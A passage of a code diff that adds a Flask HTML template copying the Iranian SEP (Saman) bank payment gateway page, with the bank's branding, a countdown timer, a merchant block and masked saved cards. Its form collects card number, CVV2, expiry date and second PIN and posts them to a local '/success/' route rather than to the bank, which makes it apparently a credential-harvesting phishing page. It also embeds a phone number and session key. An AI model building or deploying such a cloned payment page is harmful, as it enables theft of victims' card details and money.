@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="fa">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="download_date" content="2025-03-03T16:22:02.800Z" />
+  <title>درگاه پرداخت اینترنتی سِپ - پرداخت الکترونیک سامان</title>
+  
+  
+
+  
+
+
+
+  <meta http-equiv="x-ua-compatible" content="IE=edge,10,11">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport"
+    content="width=device-width, user-scalable=0, initial-scale=1, minimum-scale=1, maximum-scale=1">
+  <meta name="description" content="درگاه پرداخت اینترنتی سِپ">
+
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="language" content="fa_IR">
+
+
+  <script type="text/javascript">
+    var areaName = "OnlinePG", userSessionKey = "ZYGY24xa3Qg", userCellNumber = "9909494046", culture = "fa", hostAddress = "http://127.0.0.1:5000", serverUrl = "http://127.0.0.1:5000", actionUrl = "http://127.0.0.1:5000", removeEmailUrl = "http://127.0.0.1:5000", autoHideMessageTimeOut = 1700, gilenam = "True";
+    var otpSettings = {
+      maxTriesCount: 5, maxTriesMessage: "پیام حداکثر تعداد درخواست رمز یکبار مصرپ", otpTimeOut: 120, otpTryAgainMessage: "مشتری گرامی، چنانچه قبلا نسبت به پویاسازی رمز دوم خود اقدام نموده و از صحت اطلاعات واردشده اطمینان دارید ولی هنوز رمز دوم پویا را دریافت نکرده اید، مجددا دکمه درخواست رمز پویا رابفشارید .", baseUrl: "http://127.0.0.1:5000c", otpTryAgainButtonTitle: "دریافت مجدد رمز پویا"
+    };
+    var giftCardHintMessage = "کاربر گرامی؛ کارت هدیه شما نیاز به دریافت رمز پویا ندارد خواهشمند است از رمز دوم ثابت کارت هدیه خود استفاده نمایید.";
+    var langs = {
+      more: "بیشتر",
+      less: "کمتر",
+      virtualNumPad: "صفحه کلید امن",
+      bank: "بانک",
+      otpButton: "دریافت رمز پویا",
+      otpButtonTitle: "رمز پویا",
+      serviceUnavailable: "سرویس در حال حاضر در دسترس نیست",
+      transactionDetails: "جزییات تراکنش",
+      neverMind: "انصراف",
+      addNewCard: "افزودن کارت جدید",
+      cardsManagement: "مدیریت کارت‌ها",
+      deleteCard: "حذف",
+      errorProgress: "خطا در پردازش درخواست",
+      successPayment: "تراکنش با موفقیت انجام شد", validations: {
+        invalidValue: "مقدار وارد شده صحیح نیست", invalidEmailAddress: "ایمیل وارد شده صحیح نمی‌باشد", invalidCellNumber: "شماره موبایل ارسالی درست نمی‌باشد", cardExpired: "کارت شما منقضی شده است"
+      }
+    };
+  </script>
+
+
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+
+
+
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+
+
+</head>
+
+<body>
+  <!--[if !IE]>-->
+
+  <header  class="header"  role="heading" aria-label="درگاه پرداخت اینترنتی سِپ">
+    <div class="container">
+      <div class="nav">
+        <h1 class="font-bold">درگاه پرداخت اینترنتی سِپ</h1>
+
+
+      </div>
+      <div class="card">
+        <image src="{{url_for('static',filename='images/sapwhite.png')}}" class=""></image>
+        <div class="center-div">
+          <h1 class="hide-sm">درگاه پرداخت اینترنتی سِپ</h1>
+          <div class="timer-holder show-sm">
+            <div class="purchase-timer">
+              <h2>زمان باقی‌مانده:</h2>
+              <h1 id="timer" class="remaining-time" aria-live="assertive">09:56</h1>
+            </div>
+          </div>
+        </div>
+        <image src="{{url_for('static',filename='images/shaparak.png')}}" class=""></image>
+
+      </div>
+    </div>
+    <form action="/OnlinePG/OnlinePG" id="frmCulture" method="post"> <input id="ViewName" name="ViewName" type="hidden"
+        value="Card">
+      <input id="SessionKey" name="SessionKey" type="hidden" value="ZYGY24xa3Qg">
+      <input id="Action" name="Action" type="hidden" value="changeculture">
+      <input id="Culture" name="Culture" type="hidden" value="en">
+    </form>
+  </header>
+  <div class="main" data-culture="fa" data-version="">
+    <div class="container">
+
+
+      <main class="purchase" role="main" aria-label="درگاه پرداخت اینترنتی سِپ">
+        <div class="row reverse auto-flow">
+          <section class="col col-4" role="presentation" aria-label="جزییات تراکنش - اطلاعات پذیرنده">
+            <div class="card">
+
+              <div class="purchase-timer hide-sm" data-timeout="600000">
+                <h2>زمان باقی‌مانده:<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></h2>
+                <mark class="remaining-time">09:56</mark>
+              </div>
+              <div class="merchant">
+                <div class="merchant-logo">
+                <image src="{{url_for('static',filename='images/eazypay.png')}}" ></image>
+                </div>
+                <div class="merchant-name">
+                  <image src="{{url_for('static',filename='images/host.png')}}" class=""></image>
+
+                  <span>پذیرنده<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                          class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                          xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></span>
+                  <h2>توسن سها<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                          class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                          xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></h2>
+                </div>
+                <div class="purchase-value">
+                  <div class="value">
+                    <image src="{{url_for('static',filename='images/mablagh.png')}}" class=""></image>
+                    <span>مبلغ<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                            class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></span>
+                    <h2>1,500,000 ریال</h2>
+                  </div>
+                  <div class="letters">
+                    <small>یکصد و پنجاه هزار تومان<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                            class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></small>
+                  </div>
+                </div>
+                <div class="merchant-info">
+                  <div class="item">
+                            <image src="{{url_for('static',filename='images/x.png')}}" class=""></image>
+
+                    <span>شماره پذیرنده / ترمینال<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                            class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></span>
+                    <em>13956873 / 13126547<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                            class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></em>
+                  </div>
+                  <div class="item">
+                    <image src="{{url_for('static',filename='images/y.png')}}" class=""></image>
+
+                    <span>سایت پذیرنده<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                            class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></span>
+                    <em>ezpay.ir</em>
+                  </div>
+                </div>
+                <button id="MoreBtn" name="MoreBtn" class="action action-more" data-relation="MerchantInfo"
+                  role="button" tabindex="0" aria-label="بیشتر">بیشتر</button>
+              </div>
+
+            </div>
+          </section>
+          <div class="col col-8">
+            <section class="card" role="form" aria-label="پرداخت">
+              <form  method="POST" action="/success/">
+              <div class="head hide-sm">
+                <h2>اطلاعات کارت خود را وارد کنید<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></h2>
+              </div>
+              <input id="1" name="Culture" type="hidden" value="fa" class="ignore">
+              <input id="SessionKey" name="SessionKey" type="hidden" value="ZYGY24xa3Qg" class="ignore">
+              <div class="row">
+                <div class="col col-12">
+                  <label for="CardNumber_PanString">شماره کارت<sider-trans
+                      data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                          style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></label>
+                  <div class="input-holder has-action">
+                    <input aria-label="شماره کارت" autocomplete="off" class="mono" data-focus="Cvv2"
+                      data-label="شماره کارت" data-name="PanNumber" data-val="true"
+                      data-val-required="شماره کارت الزامی است" dir="ltr" id="CardNumber_PanString" inputmode="numeric"
+                      maxlength="19" minlength="16" name="CardNumber.PanString" placeholder="____ ____ ____ ____"
+                      tabindex="0" type="tel" value="">
+                    <button id="CardList" name="CardList" type="button" class="action" data-relation="CardList"
+                      role="button" tabindex="0" aria-label="لیست کارت‌ها" aria-pressed="false">
+                      <image src="{{url_for('static',filename='images/sapwhite.png')}}" class=""></image>
+
+                    </button>
+                    <i class="icn-xcross clear"></i>
+                    <div class="card-logo"></div>
+                    <div class="card-list unselect">
+                      <div id="scroll" class="card-enroll" role="list"><a href="javascript:void(0)"
+                          data-card="227866117" data-expired="true" data-owner="1" data-default="false"
+                          data-gift="false" tabindex="0" aria-label=" ملی ایران | 6037 99•• •••• 5789"
+                          role="listitem"><span class="card-num">6037 70•• •••• 6412</span><span> کشاورزی</span></a><a
+                          href="javascript:void(0)" data-card="100556678" data-expired="true" data-owner="1"
+                          data-default="false" data-gift="false" tabindex="0"
+                          aria-label=" ملی ایران | 6037 99•• •••• 2112" role="listitem"><span class="card-num">6037 99••
+                            •••• 2112</span><span> ملی ایران</span></a><a href="javascript:void(0)" data-card="96127196"
+                          data-expired="true" data-owner="1" data-default="false" data-gift="false" tabindex="0"
+                          aria-label=" صادرات ایران | 6037 69•• •••• 7323" role="listitem"><span class="card-num">6037
+                            69•• •••• 7323</span><span> صادرات ایران</span></a></div>
+                      <div id="scroll" class="card-manager"><a href="javascript:void(0)" tabindex="0"
+                          aria-label="حذف : 6037 99•• •••• 5789">
+                          <div class="delete-card" data-pan="603799••••••5789" data-card="227866117"><i
+                              class="icn-bin"></i><span>حذف</span></div><span class="card-num">6037 99•• ••••
+                            5789</span>
+                        </a><a href="javascript:void(0)" tabindex="0" aria-label="حذف : 6037 70•• •••• 6412">
+                          <div class="delete-card" data-pan="603770••••••6412" data-card="98706131"><i
+                              class="icn-bin"></i><span>حذف</span></div><span class="card-num">6037 70•• ••••
+                            6412</span>
+                        </a><a href="javascript:void(0)" tabindex="0" aria-label="حذف : 6037 99•• •••• 2112">
+                          <div class="delete-card" data-pan="603799••••••2112" data-card="100556678"><i
+                              class="icn-bin"></i><span>حذف</span></div><span class="card-num">6037 99•• ••••
+                            2112</span>
+                        </a><a href="javascript:void(0)" tabindex="0" aria-label="حذف : 6037 69•• •••• 7323">
+                          <div class="delete-card" data-pan="603769••••••7323" data-card="96127196"><i
+                              class="icn-bin"></i><span>حذف</span></div><span class="card-num">6037 69•• ••••
+                            7323</span>
+                        </a></div>
+                      <div class="card-commander"><a href="javascript:void(0)" class="add-card" tabindex="0"
+                          aria-label="افزودن کارت جدید"><i class="icn-card-add"></i><span>افزودن کارت جدید</span></a><a
+                          href="javascript:void(0)" class="manage-cards" tabindex="0" aria-label="مدیریت کارت‌ها"><i
+                            class="icn-card-xcross"></i><span>مدیریت کارت‌ها</span></a></div>
+                    </div>
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="CardNumber.PanString"
+                    data-valmsg-replace="true"></span>
+                  <input id="SelectedCardId" name="SelectedCardId" type="hidden" class="ignore">
+                  <input id="SelectedCardOwner" name="SelectedCardOwner" type="hidden" class="ignore">
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  <label for="Cvv2">شماره شناسایی دوم <small class="en">(CVV2)</small><sider-trans
+                      data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                          style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></label>
+                  <div class="input-holder has-action">
+                    <input aria-label="CVV2" autocomplete="off" class="password en-plh" data-back="CardNumber_PanString"
+                      data-focus="Month" data-label="CVV2" data-name="Cvv2" data-short="false" data-val="true"
+                      data-val-length="تعداد کارکترهای فیلد CVV2 باید بین 3 و 4 باشد" data-val-length-max="4"
+                      data-val-length-min="3" data-val-regex="فیلد CVV2 فقط مقادیر عددی می‌پذیرد"
+                      data-val-regex-pattern="^\d+$" data-val-required="CVV2 الزامی است" id="Cvv2" inputmode="numeric"
+                      maxlength="4" minlength="3" name="Cvv2" placeholder="CVV2" tabindex="0" type="tel" value="">
+                    <button id="CvvVirtualKeypad" name="CvvVirtualKeypad" type="button" class="action"
+                      data-relation="VirtualKeypad" role="button" tabindex="0" aria-label="صفحه کلید امن"
+                      aria-pressed="false">
+                      <image src="{{url_for('static',filename='images/keyboard.png')}}" class=""></image>
+                    </button>
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="Cvv2"
+                    data-valmsg-replace="true"></span>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  <label for="Month">تاریخ انقضا<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                          class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                          xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></label>
+                  <div class="input-group match">
+                    <input aria-label="ماه تاریخ انقضا" autocomplete="off" class="mono fa-plh" data-back="Cvv2"
+                      data-focus="Year" data-label="تاریخ انقضا" data-name="Month" data-val="true"
+                      data-val-range="فیلد ماه می بایست عددی بین 1 تا 12 باشد" data-val-range-max="12"
+                      data-val-range-min="1" data-val-required="ماه الزامی است" id="Month" inputmode="numeric"
+                      maxlength="2" minlength="2" name="Month" placeholder="ماه" tabindex="0" type="tel" value="">
+                    <input aria-label="سال تاریخ انقضا" autocomplete="off" class="mono fa-plh" data-back="Month"
+                      data-current-year="03" data-focus="CaptchaInputText" data-label="تاریخ انقضا" data-name="Year"
+                      data-val="true" data-val-required="سال الزامی است" id="Year" inputmode="numeric" maxlength="2"
+                      minlength="2" name="Year" placeholder="سال" tabindex="0" type="tel" value="">
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="Month"
+                    data-valmsg-replace="true"></span>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="Year"
+                    data-valmsg-replace="true"></span>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  <label for="CaptchaInputText">کد امنیتی<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                          class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                          xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></label>
+                  <div class="input-group">
+                    <div class="input-holder has-action action-left">
+                      <input id="CaptchaInputText" name="CaptchaInputText" type="tel" inputmode="numeric" minlength="5"
+                        maxlength="5" autocomplete="off" placeholder="کد امنیتی" data-name="CaptchaInputText"
+                        data-focus="Pin2" data-back="Year" data-label="کد امنیتی" data-val="true"
+                        data-val-required="کد امنیتی الزامی است" aria-describedby="CaptchaSecurityField-error"
+                        tabindex="0" aria_label="کد امنیتی">
+                      
+                    </div>
+                    <div class="captcha-holder">
+                      <img id="CaptchaImage"
+                        src="{{url_for('static',filename='images/capcha.png')}}">
+                    </div>
+                  </div>
+
+                  <span data-valmsg-for="CaptchaInputText" data-valmsg-replace="true"
+                    class="input-wrong field-validation-error"></span>
+                  
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  <label for="Pin2">رمز دوم<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                          class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                          xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></label>
+                  <div class="input-group">
+                    <div class="input-holder has-action action-left">
+                      <input aria-label="رمز دوم" autocomplete="off" class="password en-plh"
+                        data-back="CaptchaInputText" data-focus="Purchase" data-label="رمز دوم" data-name="Pin2"
+                        data-val="true" data-val-length="تعداد کارکترهای فیلد رمز دوم باید بین 4 و 12 باشد"
+                        data-val-length-max="12" data-val-length-min="4"
+                        data-val-regex="فیلد رمز دوم فقط مقادیر عددی می‌پذیرد" data-val-regex-pattern="^\d+$"
+                        data-val-required="رمز دوم الزامی است" id="Pin2" inputmode="numeric" maxlength="12"
+                        minlength="5" name="Pin2" placeholder="رمز دوم" tabindex="0" type="tel" value="">
+                      <button id="Pin2VirtualKeypad" name="Pin2VirtualKeypad" type="button" class="action"
+                        data-relation="VirtualKeypad" role="button" tabindex="0" aria-label="صفحه کلید امن"
+                        aria-pressed="false">
+                        <image src="{{url_for('static',filename='images/keyboard.png')}}" class=""></image>
+                      </button>
+                    </div>
+                    <button id="Otp" name="Otp" type="button" class="button fixed-width" data-action="Otp" role="button"
+                      tabindex="0">دریافت رمز پویا<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                            class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                              d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                              fill="currentColor"></path>
+                          </svg></sider-trans-inline></sider-trans></button>
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="Pin2"
+                    data-valmsg-replace="true"></span>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  
+                </div>
+              </div>
+              <div class="row mless-3x">
+                <div class="col col-12">
+                  <button id="Purchase" name="Purchase" type="submit" class="button success full-width"
+                    data-focus="Cancel" data-back="Pin2" data-action="Purchase" role="button" tabindex="0">پرداخت
+                    1,500,000 ریال</button>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  <button id="Cancel" name="Cancel" type="button" class="button outline danger full-width"
+                    data-action="Cancel" data-back="Purchase" role="button" tabindex="0">انصراف<sider-trans
+                      data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                          style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></button>
+                </div>
+              </div>
+              <div class="row mless">
+                <div class="col col-12">
+                
+                </div>
+              </div>
+
+
+              <div class="row hide" data-relation="SendReceipt">
+                <div class="col col-12 mless-2x">
+                  <label>شماره موبایل و ایمیل خود را وارد کنید <small>(اختیاری)</small></label>
+                </div>
+                <div class="col col-12">
+                  <label for="Email">ایمیل</label>
+                  <div class="input-holder">
+                    <input aria-label="ایمیل" autocomplete="off" class="en" data-back="Pin2" data-focus="CellNumber"
+                      data-label="ایمیل" data-name="Email" data-val="true"
+                      data-val-email="آدرس پست الکترونیک خود راصحیح وارد نمایید"
+                      data-val-length="فیلد آدرس ایمیل حداکثر 255 کاراکتر ظرفیت دارد" data-val-length-max="255"
+                      dir="ltr" id="Email" maxlength="255" minlength="5" name="Email" placeholder="mail@domain.com"
+                      tabindex="0" type="email" value="">
+                    <div class="email-list unselect">
+                    </div>
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="Email"
+                    data-valmsg-replace="true"></span>
+                  <input id="SaveMyEmail" name="SaveMyEmail" type="checkbox" class="hide">
+                </div>
+              </div>
+
+              <div class="row hide" data-relation="SendReceipt">
+                <div class="col col-12">
+                  <label for="CellNumber">شماره موبایل</label>
+                  <div class="input-holder">
+                    <input aria-label="شماره موبایل" autocomplete="off" class="mono" data-back="Email"
+                      data-focus="Purchase" data-label="شماره موبایل" data-name="CellNumber" dir="ltr" id="CellNumber"
+                      inputmode="numeric" maxlength="11" minlength="11" name="CellNumber" placeholder="09__ ___ ____"
+                      tabindex="0" type="tel" value="">
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="CellNumber"
+                    data-valmsg-replace="true"></span>
+                </div>
+              </div>
+              </form>
+            </section>
+          </div>
+        </div>
+      </main>
+
+      <div class="knowledge">
+        <div class="row" role="note" aria-label="نکته امنیتی">
+          <div class="col col-12">
+            <div class="card">
+              <div class="head">
+                <h2>نکته امنیتی<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></h2>
+              </div>
+              <ul class="knowledge-list text-justify">
+                <li>دارنده محترم کارت بانکی، با مراجعه به بانک خود یا یکی از روشهای مورد نظر بانک شما، به منظور تایید
+                  شماره همراه و پویاسازی رمز دوم کارت خود اقدام نمایید.<sider-trans
+                    data-url-id="-646198308"><sider-trans-inline><svg class="sider-trans-icon sider-trans-loading"
+                        style="display: inline;" width="12" height="12" xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="row" role="note" aria-label="راهنمای استفاده از رمز پویا">
+          <div class="col col-12">
+            <div class="card">
+              <div class="head">
+                <h2>راهنمای استفاده از رمز پویا<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
